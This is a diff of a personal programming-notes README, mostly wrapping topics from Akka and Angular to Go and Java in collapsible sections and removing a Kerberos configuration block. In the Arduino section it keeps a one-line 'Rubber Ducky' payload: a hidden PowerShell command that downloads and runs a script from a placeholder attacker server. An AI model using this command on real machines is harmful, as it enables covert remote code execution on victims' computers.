@@ -94,9 +94,8 @@ Table of Contents
   * [Red](#red)
 - [General](#general)
 
-
-# Akka
-
+<details>
+<summary><h1>Akka</h1></summary>
 Akka es un modelo de actores
 
 *Akka Actors* / Streams / Cluster (Cluster de aplicaciones, programación distribuida) / Persistence (Para guardar el estado del actor en base de datos) / Management (Helpers de integracion, ej con kubernetes) / http (Server para armar API Rest - Play 2.6) / Alpakka (Patrones de integración -> Apache Camel)
@@ -152,9 +151,10 @@ forward - hace un forward a otro actor
 pipeTo - El resultado cuando se complete un future se lo va a mandar a un actor (Ej: future.pipeTo(printer))
 
 para crear hijos se utiliza el context.actorOf(Props[Child], "child") - context es el actor padre
+</details>
 
-
-# Angular
+<details>
+<summary><h1>Angular</h1></summary>
 
 npm install --save-dev @angular/cli@latest -> CLI version
 
@@ -197,18 +197,20 @@ ng serve --host=0.0.0.0 --disableHostCheck=true
 Rejected request from RFC1918 IP to public server address
 
 I have to add the NAT Forwarding entry in my router to forward the port 80 request to my local IP Address, and that solved the issue.
+</details>
 
-
-# Arduino
+<details>
+<summary><h1>Arduino</h1></summary>
 
 Rubber ducky - digispark
 
 [http://digistump.com/wiki/digispark/tutorials/connecting#using_the_digispark_with_the_arduino_ide](http://digistump.com/wiki/digispark/tutorials/connecting#using_the_digispark_with_the_arduino_ide)
 
 "powershell.exe -W Hidden -C iex (new-object net.webclient).downloadstring('attacker_server')"
+</details>
 
-
-# Ansible
+<details>
+<summary><h1>Ansible</h1></summary>
 
 playbook.yml
 
@@ -243,9 +245,10 @@ web2.machine
 db1.machine
 
 Ansible Galaxy is Ansible’s official community hub for sharing Ansible roles. A role is the Ansible way of bundling automation content and making it reusable.
+</details>
 
-
-# AWS
+<details>
+<summary><h1>AWS</h1></summary>
 
 Formas simples de ahorrar dinero en AWS:
 
@@ -262,11 +265,11 @@ Formas un poquito más avanzadas:
 - Shared services VPC
 
 - Cache por todos lados (y en particular cache locales en cada región)
+</details>
 
+<details>
+<summary><h1>Big O</h1></summary>
 
-# Big O
-
-BigO
 - Remove constants
 - Growth is with respect to the input
 - Worst case
@@ -449,8 +452,10 @@ Conclusión
 El análisis de la complejidad de un algoritmo debe ser una habilidad básica de cualquier desarrollador porque permite escribir programas que son más eficientes y escalables a largo plazo.
 
 Una buena forma de practicar es revisar código escrito por nosotros mismos o por alguna biblioteca y tratar de obtener la complejidad de métodos o funciones, también la próxima vez que hagamos un programas nos podemos detener unos minutos para analizarlo.
+</details>
 
-# CSS
+<details>
+<summary><h1>CSS</h1></summary>
 
 The content-visibility has three values we can use:  
 
@@ -466,9 +471,10 @@ font-size: clamp(3rem, 5vw + 1rem, 6rem)
 clamp(1,5rem, 8vw - 2rem, 3rem)  
 calc(16px + 8 * ((100vw - 320px) / 1600))  
 heigh: 100dvh / 100svh  
+</details>
 
-
-# Data Structures
+<details>
+<summary><h1>Data Structures</h1></summary>
 
 ArrayList - if you remove or add in the front you have to shift everything  
 ArrayList are good for get operations / random access and insert / remove at the end, but sucks on insert / remove on the front (shift / unshift)  
@@ -478,16 +484,19 @@ ArrayBuffer / RingBuffer - it’s a list with null on both sides, the head and t
 
 
 JS Array is an ArrayList underneath the hood
+</details>
 
+<details>
+<summary><h2>Recursion</h2></summary>
 
-## Recursion
 - Base case
 - Recurse
     - Pre
     - Recurse
     - Post
 
-## Trees
+<details>
+<summary><h2>Trees</h2></summary>
 
 Pre-order: root at the beginning \
 In-order: root at the middle \
@@ -501,9 +510,11 @@ Breath-First: Queue
 Binary Search Tree = BST \
 Only rule: left side has to be less or equal and right side has to be greater than \
 Logn if it’s balanced or n if it’s not
+</details>
 
+<details>
+<summary><h2>Heap</h2></summary>
 
-## Heap
 Heap = Priority Queue
 
 Maintain week order \
@@ -525,22 +536,26 @@ Down:
 
 Up:
 (i-1) / 2  
+</details>
 
-
-## Trie tree
+<details>
+<summary><h2>Trie tree</h2></summary>
 
 Try trees / prefix / digital tree \
 Auto complete tree \
 O(1) \
 Root has no value \
+</details>
 
+<details>
+<summary><h2>Graphs/h2></summary>
 
-## Graphs
 Can be represented as a list or as a matrix \
 Non negative weights
+</details>
 
-
-## Maps
+<details>
+<summary><h2>Maps/h2></summary>
 
 It’s and ArrayList \
 Needs a hash function to hash the key \
@@ -551,23 +566,29 @@ Load factor: amount of data points vs amount of storage (data.len / storage.capa
 Key: value that is hashable and is used to look up data. The hash has to be consistent \
 Value: value associated with the key \
 Collision: when 2 keys map to the same cell \
+</details>
 
+<details>
+<summary><h2>LRU Cache/h2></summary>
 
-## LRU Cache
 LRU = Least Recently Used \
 It’s a Hashmap with its value is a pointer to another item \
 Composition of hash map + Double linked list \
 The head is when we update the cache to the most recently used item and the tail is when we need to remove from the cache \
+</details>
 
-
-## Interview
+<details>
+<summary><h2>Interview/h2></summary>
 
 I in fact, even have a question that Netflix I used to ask all the time,which was implement an async request queue,in which only three requests can be out at any one time.Or three async operations can be out at any one time.And when they inevitably use an array, or use the JavaScript brackets,I'd go, why would you not want to use those?And they'd say, well, I'm using them because you can do shift and non-shift.And I go, okay, well, I mean if you have a million items in there,do you still use them?And they go, yeah, why not?And I know for a fact they haven't thought about the fact, that when you remove oradd to the front, you are fundamentally having to shift everything
 
 Obviously, we couldn't get the median very easily right now because we don't actuallyhave that available.There is a trick to get the median if you use two heaps.We're not gonna do that, it's a stupid Google interview question
+</details>
 
+</details>
 
-# Firebase
+<details>
+<summary><h1>Firebase/h1></summary>
 
 ng build --prod
 
@@ -582,12 +603,17 @@ agregar key target en el firebse.json
 firebase target:apply hosting buenaSonrisa buenasonrisa
 
 firebase deploy --only hosting
+</details>
 
-# Flutter
-
+<details>
+<summary><h1>Flutter/h1></summary>
+	
 flutter run -d web-server --web-hostname 0.0.0.0 --web-port 8989
 
-# Github
+</details>
+
+<details>
+<summary><h1>Github/h1></summary>
 
 Crear PR con commits especificos
 
@@ -696,10 +722,11 @@ cuando se hizo squash merge
 git merge --strategy-option ours (edited) 
 así mergea, y todo conflicto que haya le pone lo que haya en develop
 desde develop
+</details>
 
-
-# Go
-
+<details>
+<summary><h1>Go/h1></summary>
+	
 go build file.go -> genera un ejecutable
 
 go run file.go -> ejecuta
@@ -719,9 +746,10 @@ cuando una funcion devuelve mas de un valor (por ejemplo Atoi) se puede agregar 
 value,_ := strconv.Atoi("22");
 
 In Go names starting with a capital letter are public, names with a lowercase letter are private
+</details>
 
-
-# HTML
+<details>
+<summary><h1>HTML/h1></summary>
 
 datalist - Dropdown with searchable text
 
@@ -738,10 +766,11 @@ contenido editable:
 	<div class="edit" contenteditable>
 		You can edit me...and add as much ye wish!
 	</div>
+</details>
 
-
-# Java
-
+<details>
+<summary><h1>Java/h1></summary>
+	
 *   JME – Mobile (GPS, Tablets, Celulares)
 *   JSE – Desktop
 *   JEE – Aplicación Web
@@ -1238,22 +1267,6 @@ Because of this, myBatis is faster than Hibernate at SELECTS.
 These two cases are the difference between Commands where you want to change the domain data and Responses where you just want to fetch some data.
 
 
-## Kerberos
-
-Configurar las properties servicePrincipal y keyTabLocation del bean kerberosServiceAuthenticationProvider tal como el siguiente ejemplo:
-
-	<beans:bean id="kerberosServiceAuthenticationProvider" class="org.springframework.security.kerberos.authentication.KerberosServiceAuthenticationProvider">
-		<beans:property name="ticketValidator">
-			<beans:bean class="org.springframework.security.kerberos.authentication.sun.SunJaasKerberosTicketValidator">
-				<beans:property name="servicePrincipal" value="tiam.kerberos@SIDERCA.TECHINT.NET" />
-				<beans:property name="keyTabLocation" value="file:///var/opt/identicum/tiam.kerberos.keytab" />
-				<beans:property name="debug" value="true" />
-			</beans:bean>
-		</beans:property>
-		<beans:property name="userDetailsService" ref="ldapUserDetailsService" />
-	</beans:bean>
-
-
 ## Maven
 
 Maven plugin com.spotify para build images docker
@@ -1617,6 +1630,7 @@ Redirect desde el / a una app en tomcat
 Crear carpeta ROOT en ../tomcat/webapps/
 crear archivo index.jsp con la siguiente linea 
 <% response.sendRedirect("/idmdash"); %>
+</details>
 
 
 # Javascript
